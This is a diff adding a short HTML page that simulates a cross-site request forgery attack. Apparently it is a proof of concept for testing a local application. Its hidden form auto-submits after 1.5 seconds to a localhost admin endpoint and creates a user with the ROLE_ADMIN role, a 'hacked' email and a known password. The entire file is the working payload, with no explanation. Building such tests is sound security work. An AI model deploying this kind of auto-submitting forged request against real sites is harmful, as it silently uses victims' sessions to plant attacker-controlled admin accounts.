@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Attack</title>
+</head>
+<body>
+<h1>Simulating CSRF Attack...</h1>
+<form action="http://localhost:8080/admin/user" method="POST" id="csrfForm">
+  <input type="hidden" name="username" value="user3" />
+  <input type="hidden" name="email" value="hacked@example.com" />
+  <input type="hidden" name="roleName" value="ROLE_ADMIN" />
+  <input type="hidden" name="password" value="pass1" />
+</form>
+<script>
+  setTimeout(() => {
+    document.getElementById('csrfForm').submit();
+  }, 1500);
+</script>
+</body>
+</html>
